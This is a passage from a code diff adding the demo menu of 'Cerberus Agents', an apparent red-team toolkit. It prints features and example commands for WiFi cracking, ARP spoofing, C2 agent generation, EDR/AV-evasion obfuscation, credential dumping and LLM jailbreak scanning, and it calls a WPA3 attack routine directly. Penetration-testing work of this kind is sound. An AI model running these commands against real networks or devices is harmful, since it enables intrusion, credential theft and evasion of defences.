+    print("\n🔗 Real Integration: CloudFox AWS attack paths")
+
+def demo_caldera():
+    """Demo MITRE Caldera Integration"""
+    print("\n" + "=" * 70)
+    print("⚔️  MITRE CALDERA INTEGRATION - ADVERSARY EMULATION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Automated adversary emulation platform")
+    print("   • MITRE ATT&CK technique execution")
+    print("   • Adversary profile simulation (APT29, FIN7, etc.)")
+    print("   • Multi-platform agent support (Windows, macOS, Linux)")
+    print("   • Automated purple team exercises")
+    print("   • Operation creation and monitoring via API")
+    print("   • Real-time agent management")
+    print("   • Comprehensive operation reporting")
+    print("   • Web UI for team collaboration")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.caldera_integration --list-agents --authorized")
+    print("  python -m cerberus_agents.caldera_integration --list-adversaries --authorized")
+    print("  python -m cerberus_agents.caldera_integration --create-operation 'Test Op' --adversary <ID> --authorized")
+    print("\n🔗 Real Integration: MITRE Caldera ATT&CK platform")
+
+def demo_ghidra():
+    """Demo Ghidra Wrapper"""
+    print("\n" + "=" * 70)
+    print("🔬 GHIDRA WRAPPER - REVERSE ENGINEERING")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • NSA's software reverse engineering framework")
+    print("   • Headless binary analysis automation")
+    print("   • Function decompilation to C code")
+    print("   • String extraction from binaries")
+    print("   • Cryptographic constant detection")
+    print("   • Full program export to C source")
+    print("   • Support for multiple architectures (x86, x64, ARM, MIPS, etc.)")
+    print("   • GUI launch support")
+    print("   • Python/Java scripting integration")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.ghidra_wrapper --analyze malware.exe --authorized")
+    print("  python -m cerberus_agents.ghidra_wrapper --analyze malware.exe --decompile main --authorized")
+    print("  python -m cerberus_agents.ghidra_wrapper --analyze malware.exe --strings --authorized")
+    print("  python -m cerberus_agents.ghidra_wrapper --gui --authorized")
+    print("\n🔗 Real Integration: NSA Ghidra reverse engineering")
+
+def demo_bettercap():
+    """Demo Bettercap Integration"""
+    print("\n" + "=" * 70)
+    print("📡 BETTERCAP - NETWORK ATTACK FRAMEWORK")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • WiFi reconnaissance and attacks")
+    print("   • ARP/DNS spoofing (MITM)")
+    print("   • Packet sniffing and analysis")
+    print("   • Bluetooth Low Energy (BLE) attacks")
+    print("   • HTTP/HTTPS interception")
+    print("   • Web-based UI with RESTful API")
+    print("   • Scriptable with caplets")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.bettercap_integration --wifi-recon wlan0 --authorized")
+    print("  python -m cerberus_agents.bettercap_integration --arp-spoof 192.168.1.100 192.168.1.1 --authorized")
+    print("\n🔗 Real Integration: Bettercap framework")
+
+def demo_aircrack():
+    """Demo Aircrack-ng Suite"""
+    print("\n" + "=" * 70)
+    print("🔓 AIRCRACK-NG SUITE - WIFI SECURITY ASSESSMENT")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • WEP cracking (FMS, PTW, KoreK attacks)")
+    print("   • WPA/WPA2-PSK cracking (dictionary attacks)")
+    print("   • WPA3 support")
+    print("   • 802.11n/ac support")
+    print("   • Deauthentication attacks")
+    print("   • Packet injection")
+    print("   • Handshake capture")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.aircrack_suite --monitor wlan0 --scan --authorized")
+    print("  python -m cerberus_agents.aircrack_suite --crack capture.cap wordlist.txt --authorized")
+    print("\n🔗 Real Integration: Aircrack-ng tools")
+
+def demo_wifite():
+    """Demo Wifite2 Automation"""
+    print("\n" + "=" * 70)
+    print("⚡ WIFITE2 - AUTOMATED WIFI AUDITING")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Fully automated WiFi auditing")
+    print("   • WPS Pixie-Dust attacks")
+    print("   • WPS PIN bruteforce (Reaver/Bully)")
+    print("   • WPA/WPA2 handshake capture")
+    print("   • PMKID attacks (clientless)")
+    print("   • WEP cracking")
+    print("   • Automatic wordlist cracking")
+    print("   • Smart filtering by power/channel/encryption")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.wifite2_automation --auto-attack wlan0 --authorized")
+    print("  python -m cerberus_agents.wifite2_automation --wps-attack wlan0 --authorized")
+    print("\n🔗 Real Integration: Wifite2 automation")
+
+def demo_ios_pentesting():
+    """Demo iOS Pentesting Framework"""
+    print("\n" + "=" * 70)
+    print("📱 iOS PENTESTING FRAMEWORK")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Frida - Dynamic instrumentation framework")
+    print("   • Objection - Runtime mobile exploration")
+    print("   • MobSF - Mobile security framework (SAST/DAST)")
+    print("   • Runtime code injection")
+    print("   • SSL pinning bypass")
+    print("   • Keychain dumping")
+    print("   • Method hooking and tracing")
+    print("   • IPA static analysis")
+    print("   • File system exploration")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.ios_pentesting_framework --list-devices --authorized")
+    print("  python -m cerberus_agents.ios_pentesting_framework --explore com.example.app --authorized")
+    print("  python -m cerberus_agents.ios_pentesting_framework --bypass-ssl com.example.app --authorized")
+    print("\n🔗 Real Integration: Frida, Objection, MobSF")
+
+def demo_merlin_c2():
+    """Demo Merlin C2 Framework"""
+    print("\n" + "=" * 70)
+    print("🚀 MERLIN C2 - MULTI-PROTOCOL COMMAND & CONTROL")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • HTTP/1.1, HTTP/2, HTTP/3 (QUIC) support")
+    print("   • Cross-platform agents (Windows, Linux, macOS)")
+    print("   • Encrypted communications")
+    print("   • Custom C2 profiles")
+    print("   • Protocol diversity for evasion")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.merlin_c2_integration --start-server 443 https --authorized")
+    print("  python -m cerberus_agents.merlin_c2_integration --generate-agent https://10.0.0.1:443 windows --authorized")
+    print("\n🔗 Real Integration: Merlin C2 framework")
+
+def demo_mangle():
+    """Demo Mangle Obfuscation"""
+    print("\n" + "=" * 70)
+    print("🔒 MANGLE - BINARY OBFUSCATION FOR EDR/AV EVASION")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • IoC string replacement")
+    print("   • Binary inflation (signature evasion)")
+    print("   • Certificate cloning")
+    print("   • Hash modification")
+    print("   • Supports .exe and .dll files")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.mangle_obfuscation --obfuscate payload.exe clean.exe --authorized")
+    print("  python -m cerberus_agents.mangle_obfuscation --inflate payload.exe large.exe 10 --authorized")
+    print("\n🔗 Real Integration: Mangle obfuscation tool")
+
+def demo_alcatraz():
+    """Demo Alcatraz Obfuscator"""
+    print("\n" + "=" * 70)
+    print("🎨 ALCATRAZ - X64 BINARY OBFUSCATOR (GUI-ONLY)")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • Control flow flattening")
+    print("   • Opaque predicates")
+    print("   • Dead code injection")
+    print("   • String encryption")
+    print("   • Anti-debugging checks")
+    print("   • Anti-VM detection")
+    print("   • Section encryption")
+    print("\n⚠️  LIMITATION:")
+    print("   • GUI-ONLY tool (Windows application)")
+    print("   • Cannot be automated via CLI")
+    print("   • Requires manual interaction")
+    print("\n💡 For CLI-based obfuscation, use Mangle instead (option 107)")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.alcatraz_obfuscator --show-features --authorized")
+    print("\n🔗 Real Integration: Alcatraz GUI application (Windows/Wine)")
+
+def demo_garak():
+    """Demo Garak AI Red Teaming"""
+    print("\n" + "=" * 70)
+    print("🤖 GARAK - AI/LLM VULNERABILITY SCANNER")
+    print("=" * 70)
+    print("\n✅ PRODUCTION FEATURES:")
+    print("   • 100+ adversarial attack modules")
+    print("   • Prompt injection testing")
+    print("   • Jailbreak techniques (DAN, AIM, etc.)")
+    print("   • Data extraction attacks")
+    print("   • Toxicity and bias testing")
+    print("   • Hallucination detection")
+    print("   • MITRE ATLAS framework mapping")
+    print("\nExample usage:")
+    print("  python -m cerberus_agents.garak_ai_redteam --scan openai gpt-4 all --authorized")
+    print("  python -m cerberus_agents.garak_ai_redteam --prompt-injection openai gpt-4 --authorized")
+    print("\n🔗 Real Integration: Garak AI red teaming")
+
+
+def demo_android_pentesting():
+    """Demo Android Pentesting Suite"""
+    print("\n" + "=" * 70)
+    print("🤖 ANDROID PENTESTING SUITE - PRODUCTION READY")
+    print("=" * 70)
+    print("\n✅ PURE PYTHON FEATURES (No Dependencies):")
+    print("  • DEX String Extraction - URLs, API keys, endpoints")
+    print("  • APK File Analysis - DEX/SO detection, file enumeration")
+    print("  • Cryptographic Hashing - MD5/SHA256")
+    print("  • ADB Network Scanning - Exposed device discovery")
+    print("\n⚙️  ENHANCED FEATURES (Requires Optional Tools):")
+    print("  • AAPT: Full manifest analysis, permissions, SDK levels")
+    print("  • ADB: Device interaction, app enumeration")
+    print("\n📦 Example Usage:")
+    print("  # APK Analysis (works without AAPT)")
+    print("  python -m cerberus_agents.android_pentesting_suite scan /path/to/app.apk --authorized")
+    print("\n  # Network ADB Scan")
+    print("  python -m cerberus_agents.android_pentesting_suite adb-scan 192.168.1.0/24 --authorized")
+    print("\n💡 Key Security Detections:")
+    print("  ✓ Dangerous permissions (with AAPT)")
+    print("  ✓ Debuggable apps (with AAPT)")
+    print("  ✓ Backup misconfigurations (with AAPT)")
+    print("  ✓ Cleartext traffic usage (with AAPT)")
+    print("  ✓ Hardcoded secrets in DEX")
+    print("  ✓ Network endpoints & API calls")
+    print("  ✓ Exposed ADB devices on network")
+    print("\n⚠️  Optional Dependencies:")
+    print("  • AAPT (Android Asset Packaging Tool) - For full manifest analysis")
+    print("  • ADB (Android Debug Bridge) - For device testing")
+    print("\n🔗 Real Integration: Pure Python + optional AAPT/ADB")
+
+
+def demo_wpa3_cracker():
+    """Demo WPA3 Cracker"""
+    print("\n" + "=" * 70)
+    print("🔐 WPA3 CRACKER (WACKER METHOD) - 2025")
+    print("=" * 70)
+    from cerberus_agents.wpa3_cracker_wacker import WPA3Cracker
+    cracker = WPA3Cracker(authorized=True)
+    cracker.online_wpa3_attack("TestSSID", "00:11:22:33:44:55", "wlan0mon", "/usr/share/wordlists/rockyou.txt")
+
+def demo_airgeddon():
+    """Demo Airgeddon Integration"""
+    print("\n" + "=" * 70)
+    print("🌐 AIRGEDDON INTEGRATION - 2025")
+    print("=" * 70)
+    from cerberus_agents.airgeddon_wrapper import AirgeddonWrapper
+    wrapper = AirgeddonWrapper(authorized=True)
+    wrapper.describe_features()
+
+def demo_wifi_pineapple():
+    """Demo WiFi Pineapple"""
+    print("\n" + "=" * 70)
+    print("🍍 WIFI PINEAPPLE INTEGRATION - 2025")
+    print("=" * 70)
+    from cerberus_agents.wifi_pineapple_integration import WiFiPineappleIntegration
+    tool = WiFiPineappleIntegration(authorized=True)
+    tool.describe_capabilities()
+
+def demo_ios_frida():
+    """Demo iOS Frida Pentesting"""
+    print("\n" + "=" * 70)
+    print("🔓 iOS FRIDA PENTESTING (ADVANCED) - 2025")
+    print("=" * 70)
+    from cerberus_agents.ios_frida_pentesting import iOSFridaPentesting
+    tester = iOSFridaPentesting(authorized=True)
+    tester.describe_ios_pentesting()
+
+def demo_macos_extended():
+    """Demo macOS Red Team"""
+    print("\n" + "=" * 70)
+    print("🍎 macOS RED TEAM EXTENDED - 2025")
+    print("=" * 70)
+    from cerberus_agents.macos_red_team_extended import macOSRedTeamExtended
+    tool = macOSRedTeamExtended(authorized=True)
+    tool.describe_attack_surface()
+
+def demo_netexec_advanced():
+    """Demo NetExec Integration"""
+    print("\n" + "=" * 70)
+    print("🎯 NETEXEC INTEGRATION (ADVANCED) - 2025")
+    print("=" * 70)
+    from cerberus_agents.netexec_integration import NetExecIntegration
+    nxc = NetExecIntegration(authorized=True)
+    nxc.describe_features()
+
+def demo_certipy():
+    """Demo Certipy ADCS"""
+    print("\n" + "=" * 70)
+    print("🎫 CERTIPY ADCS EXPLOITATION - 2025")
+    print("=" * 70)
+    from cerberus_agents.certipy_adcs_wrapper import CertipyADCSWrapper
+    tool = CertipyADCSWrapper(authorized=True)
+    tool.describe_adcs_attacks()
+
+def main():
+    """Main demo function"""
+    print_banner()
+    
+    demos = {
+        '1': demo_osint,
+        '2': demo_network_scanner,
+        '3': demo_protocol_scanner,
+        '4': ('web_vuln_scanner', 'Web Vulnerability Scanner'),
+        '5': demo_web_server_scanner,
+        '6': demo_api_scanner,
+        '7': demo_ssl_scanner,
+        '8': demo_database_scanner,
+        '9': demo_ad_attacks,
+        '10': demo_cloud_scanner,
+        '11': demo_wireless,
+        '12': demo_password_cracker,
+        '13': ('hash_cracker', 'Hash Cracker'),
+        '14': demo_container_security,
+        '15': demo_mobile_security,
+        '16': demo_post_exploitation,
+        '17': demo_social_engineering,
+        '18': ('adversary_emulation', 'Adversary Emulation'),
+        '19': ('detection_scoring', 'Detection Scoring'),
+        # NEW ADVANCED RED TEAM MODULES v4.0
+        '20': demo_impacket,
+        '21': demo_sqlmap,
+        '22': demo_subdomain_enum,
+        '23': demo_advanced_osint,
+        '24': demo_aws_exploitation,
+        '25': demo_network_poisoning,
+        '26': demo_vuln_scanner,
+        '27': demo_network_pivoting,
+        '28': ('bloodhound_analyzer', 'BloodHound AD Attack Path Analyzer'),
+        '29': ('kerberos_attacks', 'Kerberos Attack Suite'),
+        '30': ('credential_dumping', 'Credential Dumping Framework'),
+        '31': ('exploit_development', 'Exploit Development Toolkit'),
+        '32': ('fuzzing_framework', 'Fuzzing Framework'),
+        '33': ('network_mitm', 'Network MITM & Traffic Analysis'),
+        '34': ('social_engineering_advanced', 'Advanced Social Engineering'),
+        '35': ('privilege_escalation', 'Privilege Escalation Enumeration'),
+        '36': ('data_exfiltration', 'Data Exfiltration Toolkit'),
+        # NEW 2025 TOOLS
+        '122': demo_wpa3_cracker,
+        '123': demo_airgeddon,
+        '124': demo_wifi_pineapple,
+        '125': demo_ios_frida,
+        '126': demo_macos_extended,
+        '127': demo_netexec_advanced,
+        '128': demo_certipy,
+        # UTILITIES
+        '37': ('payload_generator', 'Payload Generator'),
+        '38': ('report_aggregator', 'Report Aggregator'),
+        '39': ('tiny_canary_agent', 'Tiny Canary Agent'),
+        '40': ('incident_triage_helper', 'Incident Triage Helper'),
+        '41': ('netexec_lateral_movement', 'NetExec Lateral Movement'),
+        '42': ('covenant_c2', 'Covenant C2 Framework'),
+        # ADVANCED OSINT & INTELLIGENCE v7.0
+        '43': demo_phone_email_osint,
+        '44': demo_facial_recognition,
+        '45': demo_cctv_discovery,
+        '46': demo_camera_pentesting,
+        '47': demo_ai_image_intelligence,
+        '48': demo_c2_integration,
+        # DOCUMENTATION
+        '49': show_documentation,
+        '50': run_production_tests,
+        # CUTTING-EDGE C2 & CLOUD EXPLOITATION (2025)
+        '51': demo_sliver_c2,
+        '52': demo_mythic_c2,
+        '53': demo_pacu,
+        '54': demo_prowler,
+        '55': demo_spiderfoot,
+        '56': demo_empire,
+        '57': demo_zap,
+        '58': demo_reconftw,
+        '59': demo_rclone,
+        '60': demo_dns_tunneling,
+        '61': demo_ghostpack,
+        '62': demo_poshc2,
+        # 2025 ULTRA-MODERN TOOLS (v9.0)
+        '63': demo_rustscan,
+        '64': demo_ffuf,
+        '65': demo_feroxbuster,
+        '66': demo_ligolo,
+        '67': demo_kerbrute,
+        '68': demo_enum4linux_ng,
+        '69': demo_cloudfox,
+        '70': demo_caldera,
+        '71': demo_ghidra,
+        # 2025 PRODUCTION-READY TOOLS (v10.0)
+        '72': ('chisel_tunneling', 'Chisel HTTP/HTTPS Tunneling'),
+        '73': ('trivy_scanner', 'Trivy Comprehensive Vulnerability Scanner'),
+        '74': ('evil_winrm_integration', 'evil-winrm WinRM Exploitation'),
+        '75': ('lsassy_credential_dumping', 'lsassy Remote Credential Dumping'),
+        '76': ('donpapi_secrets_dumping', 'DonPAPI Windows Secrets Dumping'),
+        '77': ('coercer_ntlm_coercion', 'Coercer NTLM Coercion Attacks'),
+        '78': ('katana_web_crawler', 'Katana Web Crawler (ProjectDiscovery)'),
+        '79': ('httpx_http_probing', 'httpx HTTP Probing (ProjectDiscovery)'),
+        '80': ('subfinder_subdomain_discovery', 'Subfinder Subdomain Discovery (ProjectDiscovery)'),
+        '81': ('naabu_port_scanner', 'Naabu Port Scanner (ProjectDiscovery)'),
+        '82': ('gowitness_screenshots', 'GoWitness Web Screenshots'),
+        '83': ('wapiti_web_scanner', 'Wapiti Black-Box Web Scanner'),
+        '84': ('kube_hunter_pentesting', 'kube-hunter Kubernetes Pentesting'),
+        '85': ('kubeletctl_exploitation', 'kubeletctl Kubelet Exploitation'),
+        '86': ('peirates_k8s_privesc', 'Peirates Kubernetes Privilege Escalation'),
+        '87': ('linwinpwn_ad_automation', 'linWinPwn AD Automation Wrapper'),
+        # AUTOMOTIVE SECURITY TESTING (v11.0)
+        '88': ('vehicle_network_scanner', 'Vehicle Network Scanner'),
+        '89': ('can_uds_scanner', 'CAN/UDS Scanner & Fuzzer'),
+        '90': ('ecu_firmware_analyzer', 'ECU Firmware Analyzer'),
+        '91': ('ota_update_scanner', 'OTA Update Scanner'),
+        '92': ('telematics_backend_tester', 'Telematics Backend Tester'),
+        '93': ('wireless_vehicle_scanner', 'Wireless Vehicle Scanner'),
+        '94': ('hil_emulator_integration', 'HIL Emulator Integration'),
+        '95': ('message_injection_runner', 'Message Injection Runner'),
+        '96': ('ecu_reflash_tools', 'ECU Reflash Tools'),
+        '97': ('infotainment_mobile_analyzer', 'Infotainment & Mobile Analyzer'),
+        '98': ('vehicle_forensics_collector', 'Vehicle Forensics Collector'),
+        '99': ('vehicle_ids_detector', 'Vehicle IDS/Detection'),
+        # UTILITIES
+        '100': ('asset_discovery_agent', 'Asset Discovery Agent'),
+        '101': ('pentest_task_runner', 'Automated Pentest Task Runner'),
+        # ADVANCED WIFI PENTESTING (v12.0 - 2025)
+        '102': demo_bettercap,
+        '103': demo_aircrack,
+        '104': demo_wifite,
+        # iOS/APPLE DEVICE PENTESTING (v12.0 - 2025)
+        '105': demo_ios_pentesting,
+        # ADVANCED C2 & EVASION (v12.0 - 2025)
+        '106': demo_merlin_c2,
+        '107': demo_mangle,
+        '108': demo_alcatraz,
+        # AI/LLM RED TEAMING (v12.0 - 2025)
+        '109': demo_garak,
+        # ANDROID PENTESTING (v13.0 - 2025)
+        '110': demo_android_pentesting,
+        # CUTTING-EDGE AZURE & ENTRA ID EXPLOITATION (v12.0 - November 2025)
+        '111': ('theharvester_integration', 'theHarvester OSINT Integration'),
+        '112': ('metagoofil_integration', 'Metagoofil Document Metadata Extraction'),
+        '113': ('sn1per_integration', 'Sn1per Automated Attack Surface Management'),
+        '114': ('sharpshooter_integration', 'SharpShooter Payload Generation Framework'),
+        '115': ('roadtools_integration', 'ROADtools Azure AD/Entra ID Enumeration'),
+        '116': ('aadinternals_integration', 'AADInternals Azure AD Exploitation'),
+        '117': ('graphrunner_integration', 'GraphRunner Microsoft Graph API Post-Exploitation'),
+        '118': ('microburst_integration', 'Microburst Azure Infrastructure Exploitation'),
+        # 2025 CONTAINER & KUBERNETES EXPLOITATION (v15.0 - November 12, 2025)
+        '119': ('cdk_container_escape', 'CDK Container Escape Toolkit'),
+        '120': ('scoutsuite_cloud_audit', 'ScoutSuite Multi-Cloud Security Auditing'),
+        '121': ('deepce_container_enum', 'deepce Container Enumeration')
+    }
+    
+    while True:
+        demo_menu()
+        choice = input("\nEnter your choice (0-121): ").strip()
+        
+        if choice == '0':
+            print("\n✅ Exiting Cerberus Agents v14.0 - 2025 EDITION. Stay secure! 🔐\n")
+            break
+        elif choice in demos:
+            demo_func = demos[choice]
+            if callable(demo_func):
+                demo_func()
+            else:
+                print(f"\n📋 Module: {demo_func[1]}")
+                print(f"Run: python -m cerberus_agents.{demo_func[0]} --help")
+            input("\nPress Enter to continue...")
+        else:
+            print("\n❌ Invalid choice. Please try again.")
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n✅ Interrupted by user. Goodbye! 🔐\n")
+        sys.exit(0)
